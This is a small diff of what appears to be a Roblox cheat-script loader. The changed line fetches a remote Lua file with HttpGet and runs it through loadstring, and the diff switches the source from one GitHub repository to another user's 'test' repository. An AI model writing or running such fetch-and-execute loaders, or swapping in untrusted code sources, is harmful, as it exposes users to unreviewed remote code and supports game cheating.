@@ -90,4 +90,4 @@ getgenv().Setting = {
         },
     }
 }
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/Xero2409/XeroHub/main/bounty.lua")))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/lqbao1103/test/9bf205e194afa308d4466fa987b2c30a40619ede/baoti.lua")))()
